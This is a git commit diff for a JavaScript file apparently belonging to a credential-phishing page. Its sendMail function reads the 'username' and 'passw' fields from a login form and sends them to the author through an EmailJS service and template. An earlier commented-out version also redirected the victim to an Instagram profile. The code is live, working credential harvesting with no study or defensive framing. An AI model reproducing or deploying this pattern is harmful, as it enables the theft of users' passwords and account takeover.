9b3d07524fcfb5b206b8ce86c46d5ef724de503f
linkshortenergu <102642948+linkshortenergu@users.noreply.github.com>
2022-05-07 23:26:48 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,22 +1,11 @@
-// function async sendmail(){
-//     let temppara = {
-//         user_name : document.getElementById("username").value,
-//         user_passw : document.getElementById("passw").value
-//     }
-//     await emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
-//     .then(function (res){
-//             window.open("https://www.instagram.com/sskk.450/");
-//         console.log("succeeed")
-//     })
-// }
-const sendmail =async ()=>{
+function sendMail(pra){
     let temppara = {
         user_name : document.getElementById("username").value,
         user_passw : document.getElementById("passw").value
     }
-    await emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
+    emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
     .then(function (res){
-            window.open("https://www.instagram.com/sskk.450/");
-        console.log("succeeed")
+            console.log("success" , res.status)
+            
     })
 }
